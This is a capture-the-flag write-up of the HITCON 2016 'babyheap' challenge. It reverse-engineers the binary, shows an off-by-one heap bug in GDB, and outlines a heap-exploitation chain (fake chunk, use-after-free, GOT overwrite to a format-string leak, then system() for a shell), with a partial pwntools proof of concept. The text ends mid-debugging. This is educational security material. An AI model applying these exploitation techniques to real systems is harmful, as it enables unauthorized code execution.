---
title: "Pwn-Babyheap(300) - Solved by 3 Teams"
sidebar_position: 1
---


## **Information**

### **Description**

```Heap so fun! Baby, don't do it first.  
nc 52.68.77.85 8731

note : the service is running on ubuntu 16.04

[babyheap](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **File**
* [babyheap\_bb488b64300c18a3cd7c60ec1deac79cddb1327b](/attachments/7536646/7537131.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536646/7537133.bin)

### **Source Code**

## **Write up**

### File information

```sh title="File Information"
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ file babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b: ELF 64-bit LSB  executable, x86-64, versin 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=2cf55840293ae4d6ddc13488c57b8009e598642f, stripped
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ checksec.sh --file babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
autolycos@ubuntu:~/CTF/HITCON/Babyheap$
```

### **Binary analysis**

#### **Main()**

* **The function has the following functions.**
  + Print the menu using the PrintMenu() function.
  + Use the UserInput() function to receive input from the user.

```sh title="Main Function"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int command; // eax@2
  char v4; // [rsp+10h] [rbp-10h]@12
  __int64 v5; // [rsp+18h] [rbp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  SetSIGALRM();
  while ( 1 )
  {
    while ( 1 )
    {
      PrintMenu();
      command = UserInput();
      if ( command != 2 )
        break;
      Delete();
    }
    if ( command > 2 )
    {
      if ( command == 3 )
      {
        Edit();
      }
      else if ( command == 4 )
      {
        printf("Really? (Y/n)", a2);
        a2 = (char **)&v4;
        __isoc99_scanf((__int64)"%2s", (__int64)&v4);
        if ( v4 != aN[0] )
          _exit(0);
      }
      else
      {
LABEL_14:
        puts("Invalid choice !");
      }
    }
    else
    {
      if ( command != 1 )
        goto LABEL_14;
      New();
    }
  }
}
```

* **The code restored to Hex-ray is a little strange as follows.**
  + - Pass the second argument value of the main() function as the second argument of the printf() function.
    - Store the value &v4 in the second argument of the main() function.

```sh title="Exit"
else if ( command == 4 )
{
	printf("Really? (Y/n)", a2);
	a2 = (char **)&v4;
	__isoc99_scanf((__int64)"%2s", (__int64)&v4);
	if ( v4 != aN[0] )
		_exit(0);
}
```

* **The following is the output of the code as assembly code.**
  + In assembly code, the second argument value of the main() function is passed as the second argument value of the scanf() function.
    - "lea rax, [rbp+var\_10]"
    - "mov rsi, rax"

```sh title="Exit Assembly"
.text:0000000000400D1A                 mov     edi, offset aReally?YN ; "Really? (Y/n)"
.text:0000000000400D1F                 mov     eax, 0
.text:0000000000400D24                 call    _printf
.text:0000000000400D29                 lea     rax, [rbp+var_10]
.text:0000000000400D2D                 mov     rsi, rax
.text:0000000000400D30                 mov     edi, offset a2s ; "%2s"
.text:0000000000400D35                 mov     eax, 0
.text:0000000000400D3A                 call    ___isoc99_scanf
.text:0000000000400D3F                 lea     rax, [rbp+var_10]
.text:0000000000400D43                 movzx   edx, byte ptr [rax]
.text:0000000000400D46                 mov     eax, offset aN  ; "n"
.text:0000000000400D4B                 movzx   eax, byte ptr [rax]
.text:0000000000400D4E                 cmp     dl, al
.text:0000000000400D50                 jz      short loc_400D6B
.text:0000000000400D52                 mov     edi, 0          ; status
.text:0000000000400D57                 call    __exit
```

* **In other words, we can infer that it is the following code.**

```sh title="Exit C Code"
else if ( command == 4 )
{
	printf("Really? (Y/n)");
	__isoc99_scanf((__int64)"%2s", (__int64)&a2);
	if ( v4 != aN[0] )
		_exit(0);
}
```

#### **UserInput()**

* **The function has the following functions.**
  + Use the read() function to receive input from the user.
  + The input value is passed to the atoi() function and an integer is returned.
* **There is a vulnerability here**
  + The size of nptr is 4 bytes, but the read() function receives 16 bytes as input.

```c title="UserInput()"
__int64 UserInput()
{
  char nptr[4]; // [rsp+10h] [rbp-20h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __read_chk(0LL, nptr, 16LL, 16LL);
  return (unsigned int)atoi(nptr);
}
```

* **You can change the value after the "nptr" variable like this:**
  + The space to store the value input to the read() function is 0x7fffffffe140.
  + You can overwrite the 0x7fffffffe148 area by entering 15 characters as shown below.

```sh title="Debugging"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q ./baby*
Reading symbols from ./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
gdb-peda$ b *0x400948
Breakpoint 1 at 0x400948
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:
Breakpoint 1, 0x0000000000400948 in ?? ()
gdb-peda$ i r rsi
rsi            0x7fffffffe140	0x7fffffffe140
gdb-peda$ x/4gx 0x7fffffffe140
0x7fffffffe140:	0x0000000000000000	0x00007ffff7ffe168
0x7fffffffe150:	0x0000000000000005	0x1f0d0a69bf7b7b00
gdb-peda$ ni
AAAAAAAABBBBBBB  

0x000000000040094d in ?? ()
gdb-peda$ x/4gx 0x7fffffffe140
0x7fffffffe140:	0x4141414141414141	0x0a42424242424242
0x7fffffffe150:	0x0000000000000005	0x1f0d0a69bf7b7b00
gdb-peda$
```

#### **New()**

* **The function uses the following structure.**

```c title="Data Structure"
struct DATA
{
  size_t size;
  char name[8];
  char *content;
};
```

* **The function has the following functions.**
  + Allocate space for the DATA structure in the gData global variable.
  + Receives the “Size” value from the user and allocates heap space equal to that size.
  + Use the UserInputStr() function to input characters as much as the value stored in “gData→size” in the “gData→content” area.
  + Use the UserInputStr() function to input up to 8 characters in the “gData→name” area.

```c title="New()"
int New()
{
  DATA *size; // rbx
  DATA *content; // rbx

  if ( gData )
  {
    puts("bye bye");
    _exit(0);
  }
  gData = (DATA *)malloc(0x18uLL);
  if ( !gData )
  {
    puts("Error");
    _exit(-1);
  }
  printf("Size :");
  size = gData;
  size->size = (signed int)UserInput();
  content = gData;
  content->content = (char *)malloc(gData->size);
  if ( !gData->content )
  {
    puts("Error");
    _exit(-1);
  }
  printf("Content:");
  UserInputStr(gData->content, (unsigned int)gData->size);
  printf("Name:");
  UserInputStr(gData->name, 8LL);
  return puts("Done!");
}
```

#### **UserInputStr**
* **The function handles the following functions:**
  + As argument values, the address to store the string and the size of the String are received.
  + Use the read() function to input a value equal to the size of the content variable.
  + Changes the value located at the end of the input string to 0.
    - It can be inferred that this is to remove the line feed (0xA) that is input when entering a string.

```c title="UserInputStr"
char *__fastcall UserInputStr(char *content, int size)
{
  char *result; // rax
  int len; // [rsp+1Ch] [rbp-4h]

  len = read(0, content, size);
  if ( len <= 0 )
  {
    puts("Error");
    _exit(-1);
  }
  result = &content[len];
  *result = 0;
  return result;
}
```

* **This is where the Off-by-One Error vulnerability arises.**
  + The value returned from the read() function is **returns the number of bytes read** through the read() function.
  + **Use the value as the position value of the array**, and change the value located at the end of the input string to 0.
  + For example, if the size of the space allocated to "content" is 8 bytes and the user enters an 8-byte string, the value of the area outside the "content" area will be changed to '0'.
  + - The array starts from ‘0’, not ‘1’.

**Off-by-One Error**

| content | [0] | [1] | [2] | [3] | [4] | [5] | [6] | [7] | [8] |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| String | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \xd9 |
| result = &content[len]; \*result = 0; | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x00 |

#### **Delete**

* **The function has the following functions.**
  + Use the gDeleteState global variable to ensure that the function operates only once. (Default value 0)
  + Use the free() function to release the area allocated to the gData → content and gData areas.

```c title="Delete()"
__int64 Delete()
{
  if ( !gData || gDeleteState )
  {
    puts("bye bye");
    _exit(0);
  }
  free(gData->content);
  free(gData);
  gData = 0LL;
  return (unsigned int)(gDeleteState++ + 1);
}
```

#### **Edit**

* **The function has the following functions.**
  + Use the global variable gEditState to ensure that the function operates only once. (Default value 0)
  + Change the content stored in “gData→content” using the UserInputString() function.

```c title="Edit()"
int Edit()
{
  if ( !gData || gEditState )
  {
    puts("bye bye");
    _exit(0);
  }
  printf("Content:");
  UserInputStr(gData->content, gData->size);
  ++gEditState;
  return puts("Done!");
}
```

### Debuging

#### **Scanf()**

* **In this program, the value is being input using the scanf() function because the “Exit” function has been selected.**
  + There is no heap area before calling the scanf() function.
  + After calling the scanf() function, a heap area is created.
    - All values ​​entered by the user are stored in the created heap area.

```sh title="scanf() 함수 호출 전, 후 메모리 변화"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q ./baby*
Reading symbols from ./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
gdb-peda$ b *0x400D3A
Breakpoint 1 at 0x400d3a
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:4
Really? (Y/n)
Breakpoint 1, 0x0000000000400d3a in ?? ()
gdb-peda$ p main_arena 
$1 = {
  mutex = 0x0, 
  flags = 0x0, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x0, 
  last_remainder = 0x0, 
  bins = {0x0 <repeats 254 times>}, 
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7ffff7dd1b20 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 0x1, 
  system_mem = 0x0, 
  max_system_mem = 0x0
}
gdb-peda$ ni
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
gdb-peda$ p main_arena 
$2 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x603410, 
  last_remainder = 0x0, 
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 
    0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 
    0x7ffff7dd1be8 <main_arena+200>, 0x7ffff7dd1be8 <main_arena+200>, 0x7ffff7dd1bf8 <main_arena+216>, 0x7ffff7dd1bf8 <main_arena+216>, 0x7ffff7dd1c08 <main_arena+232>, 
    0x7ffff7dd1c08 <main_arena+232>, 0x7ffff7dd1c18 <main_arena+248>, 0x7ffff7dd1c18 <main_arena+248>, 0x7ffff7dd1c28 <main_arena+264>, 0x7ffff7dd1c28 <main_arena+264>, 
    0x7ffff7dd1c38 <main_arena+280>, 0x7ffff7dd1c38 <main_arena+280>, 0x7ffff7dd1c48 <main_arena+296>, 0x7ffff7dd1c48 <main_arena+296>, 0x7ffff7dd1c58 <main_arena+312>, 
    0x7ffff7dd1c58 <main_arena+312>, 0x7ffff7dd1c68 <main_arena+328>, 0x7ffff7dd1c68 <main_arena+328>, 0x7ffff7dd1c78 <main_arena+344>, 0x7ffff7dd1c78 <main_arena+344>, 
    0x7ffff7dd1c88 <main_arena+360>, 0x7ffff7dd1c88 <main_arena+360>, 0x7ffff7dd1c98 <main_arena+376>, 0x7ffff7dd1c98 <main_arena+376>, 0x7ffff7dd1ca8 <main_arena+392>, 
    0x7ffff7dd1ca8 <main_arena+392>, 0x7ffff7dd1cb8 <main_arena+408>, 0x7ffff7dd1cb8 <main_arena+408>, 0x7ffff7dd1cc8 <main_arena+424>, 0x7ffff7dd1cc8 <main_arena+424>, 
    0x7ffff7dd1cd8 <main_arena+440>, 0x7ffff7dd1cd8 <main_arena+440>, 0x7ffff7dd1ce8 <main_arena+456>, 0x7ffff7dd1ce8 <main_arena+456>, 0x7ffff7dd1cf8 <main_arena+472>, 
    0x7ffff7dd1cf8 <main_arena+472>, 0x7ffff7dd1d08 <main_arena+488>, 0x7ffff7dd1d08 <main_arena+488>, 0x7ffff7dd1d18 <main_arena+504>, 0x7ffff7dd1d18 <main_arena+504>, 
    0x7ffff7dd1d28 <main_arena+520>, 0x7ffff7dd1d28 <main_arena+520>, 0x7ffff7dd1d38 <main_arena+536>, 0x7ffff7dd1d38 <main_arena+536>, 0x7ffff7dd1d48 <main_arena+552>, 
    0x7ffff7dd1d48 <main_arena+552>, 0x7ffff7dd1d58 <main_arena+568>, 0x7ffff7dd1d58 <main_arena+568>, 0x7ffff7dd1d68 <main_arena+584>, 0x7ffff7dd1d68 <main_arena+584>, 
    0x7ffff7dd1d78 <main_arena+600>, 0x7ffff7dd1d78 <main_arena+600>, 0x7ffff7dd1d88 <main_arena+616>, 0x7ffff7dd1d88 <main_arena+616>, 0x7ffff7dd1d98 <main_arena+632>, 
    0x7ffff7dd1d98 <main_arena+632>, 0x7ffff7dd1da8 <main_arena+648>, 0x7ffff7dd1da8 <main_arena+648>, 0x7ffff7dd1db8 <main_arena+664>, 0x7ffff7dd1db8 <main_arena+664>, 
    0x7ffff7dd1dc8 <main_arena+680>, 0x7ffff7dd1dc8 <main_arena+680>, 0x7ffff7dd1dd8 <main_arena+696>, 0x7ffff7dd1dd8 <main_arena+696>, 0x7ffff7dd1de8 <main_arena+712>, 
    0x7ffff7dd1de8 <main_arena+712>, 0x7ffff7dd1df8 <main_arena+728>, 0x7ffff7dd1df8 <main_arena+728>, 0x7ffff7dd1e08 <main_arena+744>, 0x7ffff7dd1e08 <main_arena+744>, 
    0x7ffff7dd1e18 <main_arena+760>, 0x7ffff7dd1e18 <main_arena+760>, 0x7ffff7dd1e28 <main_arena+776>, 0x7ffff7dd1e28 <main_arena+776>, 0x7ffff7dd1e38 <main_arena+792>, 
    0x7ffff7dd1e38 <main_arena+792>, 0x7ffff7dd1e48 <main_arena+808>, 0x7ffff7dd1e48 <main_arena+808>, 0x7ffff7dd1e58 <main_arena+824>, 0x7ffff7dd1e58 <main_arena+824>, 
    0x7ffff7dd1e68 <main_arena+840>, 0x7ffff7dd1e68 <main_arena+840>, 0x7ffff7dd1e78 <main_arena+856>, 0x7ffff7dd1e78 <main_arena+856>, 0x7ffff7dd1e88 <main_arena+872>, 
    0x7ffff7dd1e88 <main_arena+872>, 0x7ffff7dd1e98 <main_arena+888>, 0x7ffff7dd1e98 <main_arena+888>, 0x7ffff7dd1ea8 <main_arena+904>, 0x7ffff7dd1ea8 <main_arena+904>, 
    0x7ffff7dd1eb8 <main_arena+920>, 0x7ffff7dd1eb8 <main_arena+920>, 0x7ffff7dd1ec8 <main_arena+936>, 0x7ffff7dd1ec8 <main_arena+936>, 0x7ffff7dd1ed8 <main_arena+952>, 
    0x7ffff7dd1ed8 <main_arena+952>, 0x7ffff7dd1ee8 <main_arena+968>, 0x7ffff7dd1ee8 <main_arena+968>, 0x7ffff7dd1ef8 <main_arena+984>, 0x7ffff7dd1ef8 <main_arena+984>, 
    0x7ffff7dd1f08 <main_arena+1000>, 0x7ffff7dd1f08 <main_arena+1000>, 0x7ffff7dd1f18 <main_arena+1016>, 0x7ffff7dd1f18 <main_arena+1016>, 
    0x7ffff7dd1f28 <main_arena+1032>, 0x7ffff7dd1f28 <main_arena+1032>, 0x7ffff7dd1f38 <main_arena+1048>, 0x7ffff7dd1f38 <main_arena+1048>, 
    0x7ffff7dd1f48 <main_arena+1064>, 0x7ffff7dd1f48 <main_arena+1064>, 0x7ffff7dd1f58 <main_arena+1080>, 0x7ffff7dd1f58 <main_arena+1080>, 
    0x7ffff7dd1f68 <main_arena+1096>, 0x7ffff7dd1f68 <main_arena+1096>, 0x7ffff7dd1f78 <main_arena+1112>, 0x7ffff7dd1f78 <main_arena+1112>, 
    0x7ffff7dd1f88 <main_arena+1128>, 0x7ffff7dd1f88 <main_arena+1128>, 0x7ffff7dd1f98 <main_arena+1144>, 0x7ffff7dd1f98 <main_arena+1144>, 
    0x7ffff7dd1fa8 <main_arena+1160>, 0x7ffff7dd1fa8 <main_arena+1160>, 0x7ffff7dd1fb8 <main_arena+1176>, 0x7ffff7dd1fb8 <main_arena+1176>, 
    0x7ffff7dd1fc8 <main_arena+1192>, 0x7ffff7dd1fc8 <main_arena+1192>, 0x7ffff7dd1fd8 <main_arena+1208>, 0x7ffff7dd1fd8 <main_arena+1208>, 
    0x7ffff7dd1fe8 <main_arena+1224>, 0x7ffff7dd1fe8 <main_arena+1224>, 0x7ffff7dd1ff8 <main_arena+1240>, 0x7ffff7dd1ff8 <main_arena+1240>, 
    0x7ffff7dd2008 <main_arena+1256>, 0x7ffff7dd2008 <main_arena+1256>, 0x7ffff7dd2018 <main_arena+1272>, 0x7ffff7dd2018 <main_arena+1272>, 
    0x7ffff7dd2028 <main_arena+1288>, 0x7ffff7dd2028 <main_arena+1288>, 0x7ffff7dd2038 <main_arena+1304>, 0x7ffff7dd2038 <main_arena+1304>, 
    0x7ffff7dd2048 <main_arena+1320>, 0x7ffff7dd2048 <main_arena+1320>, 0x7ffff7dd2058 <main_arena+1336>, 0x7ffff7dd2058 <main_arena+1336>, 
    0x7ffff7dd2068 <main_arena+1352>, 0x7ffff7dd2068 <main_arena+1352>, 0x7ffff7dd2078 <main_arena+1368>, 0x7ffff7dd2078 <main_arena+1368>, 
    0x7ffff7dd2088 <main_arena+1384>, 0x7ffff7dd2088 <main_arena+1384>, 0x7ffff7dd2098 <main_arena+1400>, 0x7ffff7dd2098 <main_arena+1400>, 
    0x7ffff7dd20a8 <main_arena+1416>, 0x7ffff7dd20a8 <main_arena+1416>, 0x7ffff7dd20b8 <main_arena+1432>, 0x7ffff7dd20b8 <main_arena+1432>, 
    0x7ffff7dd20c8 <main_arena+1448>, 0x7ffff7dd20c8 <main_arena+1448>, 0x7ffff7dd20d8 <main_arena+1464>, 0x7ffff7dd20d8 <main_arena+1464>, 
    0x7ffff7dd20e8 <main_arena+1480>, 0x7ffff7dd20e8 <main_arena+1480>, 0x7ffff7dd20f8 <main_arena+1496>, 0x7ffff7dd20f8 <main_arena+1496>, 
    0x7ffff7dd2108 <main_arena+1512>, 0x7ffff7dd2108 <main_arena+1512>, 0x7ffff7dd2118 <main_arena+1528>, 0x7ffff7dd2118 <main_arena+1528>, 
    0x7ffff7dd2128 <main_arena+1544>, 0x7ffff7dd2128 <main_arena+1544>, 0x7ffff7dd2138 <main_arena+1560>, 0x7ffff7dd2138 <main_arena+1560>, 
    0x7ffff7dd2148 <main_arena+1576>, 0x7ffff7dd2148 <main_arena+1576>, 0x7ffff7dd2158 <main_arena+1592>, 0x7ffff7dd2158 <main_arena+1592>, 
    0x7ffff7dd2168 <main_arena+1608>, 0x7ffff7dd2168 <main_arena+1608>, 0x7ffff7dd2178 <main_arena+1624>, 0x7ffff7dd2178 <main_arena+1624>, 
    0x7ffff7dd2188 <main_arena+1640>, 0x7ffff7dd2188 <main_arena+1640>, 0x7ffff7dd2198 <main_arena+1656>, 0x7ffff7dd2198 <main_arena+1656>, 
    0x7ffff7dd21a8 <main_arena+1672>, 0x7ffff7dd21a8 <main_arena+1672>...}, 
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7ffff7dd1b20 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 0x1, 
  system_mem = 0x21000, 
  max_system_mem = 0x21000
}
gdb-peda$ x/10gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411
0x603010:	0x4141414141414141	0x4141414141414141
0x603020:	0x4141414141414141	0x4141414141414141
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x4141414141414141
gdb-peda$
```

* **The value stored in the created heap area is the value input through the scanf() function.**
  + The size of memory allocated for the scanf() function is 1024 (0x400) bytes.
  + When not in debugging mode, the size of allocated memory is 4096 (0x1000) bytes.

```sh title="heap 영역에 저장된 값"
(gdb) x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411
0x603010:	0x414141414141416e	0x4141414141414141
0x603020:	0x4141414141414141	0x4141414141414141
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x4141414141414141
0x603050:	0x000000000a414141	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
(gdb)
```

#### **Overflow(Off-by-One Error)**

* **Set the break point as follows.**

```sh title="Set Breakpoint"
gdb-peda$ b *0x4009B8
Breakpoint 1 at 0x4009b8
gdb-peda$ b *0x4009C5 
Breakpoint 2 at 0x4009c5
gdb-peda$
```

* **You can overwrite the value of top chunk by 1 byte as follows.**
  + If the size of "Content" is set to 24, the 8 bytes after the allocated memory area are used as the "Top chunk" area.
  + When 24 characters are entered as the input value for "Content", 1 byte of "Top chunk" is changed to "0x00".

```sh title="Off-by-One Error(Top chunk)"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:1 
Size :24
Content:

Breakpoint 1, 0x0000000000400996 in ?? ()
gdb-peda$ i r rsi
rsi            0x603030	0x603030
gdb-peda$ c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x00000000004009b8 in ?? ()
gdb-peda$ 
Continuing.
Breakpoint 3, 0x00000000004009c5 in ?? ()
gdb-peda$ i r rax
rax            0x603048	0x603048
gdb-peda$ x/4gx 0x603030
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x0000000000020fc1
gdb-peda$ x/bx 0x603048
0x603048:	0xc1
gdb-peda$ ni

0x00000000004009c8 in ?? ()
gdb-peda$ x/bx 0x603048
0x603048:	0x00
gdb-peda$ x/4gx 0x603030
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x0000000000020f00
gdb-peda$
```

* **You can overwrite the value of "\*content" by 1 byte as follows.**
  + “gData→content” is located after the “gData→name” variable area.
    - The address of the allocated heap area is stored in the “gData→content” area.
  + Enter 8 characters as the value for "Name" and 1 byte in the "gData→content" area will be changed to "0x00".
    - 0x603030 → 0x603000

```sh title="Off-by-One Error(content)"
gdb-peda$ c
Continuing.
Name:
Breakpoint 1, 0x0000000000400996 in ?? ()
gdb-peda$ i r rsi
rsi            0x603018	0x603018
gdb-peda$ x/4gx 0x603018
0x603018:	0x0000000000000000	0x0000000000603030
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$ c
Continuing.
AAAAAAAA

Breakpoint 2, 0x00000000004009b8 in ?? ()
gdb-peda$ 
Continuing.

Breakpoint 3, 0x00000000004009c5 in ?? ()
gdb-peda$ i r rax
rax            0x603020	0x603020
gdb-peda$ x/bx 0x603020
0x603020:	0x30
gdb-peda$ x/4gx 0x603018
0x603018:	0x4141414141414141	0x0000000000603030
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$ ni
0x00000000004009c8 in ?? ()
gdb-peda$ x/4gx 0x603018
0x603018:	0x4141414141414141	0x0000000000603000
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$
```

### Structure of Exploit code

* **Payload order is as follows.**

:::note[Payload order]
1. Write Fake chunk
2. Heap Overflow due to Off-by-One Error
3. free memory
4. Heap Overflow by UAF
5. Create FSB Vulnerability
6. Leak libc addresss
7. Acquire shell using system() function
:::

* **This is explained in more detail as follows.**

:::note[Detailed description]
1. Write Fake chunk
   1. Save the fake chunk in the heap area using the "4. Exit" function
2. Heap Overflow due to Off-by-One Error
   1. Change the “ptr->Content” value using the “1. New” function
3. free memory
   1. Release memory using the "2. Delete" function
4. Heap Overflow using UAF
   1. Heap memory of size 0x18 is created using the first malloc() function.
   2. Heap memory is created by passing the heap size stored in the fake chunk to the second malloc() function.
   3. Change the “ptr->Content” value to the GOT value of the atoi() function by entering the content.
5. Create FSB Vulnerability
   1. GOT overflow using the “3.edit” function
   2. Saving the PLT address value of the printf() function in the GOT area of ​​the atoi() function
6. Leak Libc addresss
   1. Extracting Libc addresses using FSB vulnerability
7. Acquire shell using system() function
   1. Change the value of the "gEditState" global variable to 0 by exploiting the FSB vulnerability.
   2. GOT overflow using the “3.edit” function  
      1. atoi() GOT → Libc system()
:::

* The information you need to find out for an attack based on the payload is as follows.

:::note[Information to check]
* Creation of UAF vulnerability using Off-by-One Error
  + Fake chunk structure
* FSB vulnerability
  + Leak libc addresss
:::

### Information for attack

#### **UAF vulnerability creation using off-by-one error(Fake chunk)**

* **You can create UAF vulnerabilities using the scanf() function and the "Off-by-One Error" vulnerability.**
* **Use the scanf() function to store Fake allocated chunks in the Heap area.**
  + First, because the program targeted for attack is not operating in debugging mode, the size of the heap allocated in the scanf() function is 4096 (0x1000).
  + To write accurate exploit code, you need the following code:
* **The input values ​​passed to the scanf() function are:**
  + 'n' + 'A' \* 4064 + prev\_size(0x00000000) + size(0x00000071)

```python title="poc.py"
from pwn import *

def NewFunction(size,content,name):
        p.recvuntil('Your choice:')
        p.sendline('1')
        p.recvuntil('Size :')
        p.sendline(str(size))
        p.recvuntil('Content:')
        p.sendline(content)
        p.recvuntil('Name:')
        p.sendline(name)

def DeleteFunction():
        p.recvuntil('Your choice:')
        p.sendline('2')

def EditFunction(content):
        p.recvuntil('Your choice:')
        p.sendline('3')
        p.recvuntil('Content:')
        p.sendline(content)

def ExitFunction(answer):
        p.recvuntil('Your choice:')
        p.sendline('4')
        p.recvuntil('Really? (Y/n)')
        p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')
sleep(30)
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
print "Fake chunk : " + fakechunk

ExitFunction(fakechunk)
p.interactive()
```

* **Fake allocated chunks are stored in the Heap area as follows.**
  + Heap area is allocated by the scanf() function.
    - Allocated Heap Area: 0x20e7010
    - Size of allocated heap area: 0x1000
    - Top chunk area: 0x20e8018
  + The fake allocated chunk passed as input value is stored in the following area.
    - Area where fake allocated chunk is stored: 0x20e7ff0
  + In other words, if you request the release of the 0x20e8000 area, the free() function recognizes the 0x20e7ff8 area as the size value of the allocated chunk and releases it.

```sh title="result"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ python test.py 
[+] Starting local process './babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b': pid 103665
```

* **You can check Fake allocated chunk as follows.**
  + Heap area has been allocated by scanf().
    - Allocated Heap Area: 0x20e7000
    - Allocated heap area size: 4096 (0x1000)
  + A fake chunk was saved in the heap area by the scanf() function.
    - fake chunk area: 0x20e7ff0 ~ 0x20e7ff8

```sh title="GDB attach result"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q -p 103665
Attaching to process 103665
Reading symbols from /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.23.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.23.so...done.
done.
0x00007ff57cbba55c in __read_chk (fd=0x0, buf=0x7fff44ce4270, nbytes=0x10, buflen=<optimized out>) at read_chk.c:33
33	read_chk.c: No such file or directory.
gdb-peda$ b *0x400D3A
Breakpoint 1 at 0x400d3a
gdb-peda$ c
Continuing.

Breakpoint 1, 0x0000000000400d3a in ?? ()
gdb-peda$ info proc map
process 103665
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
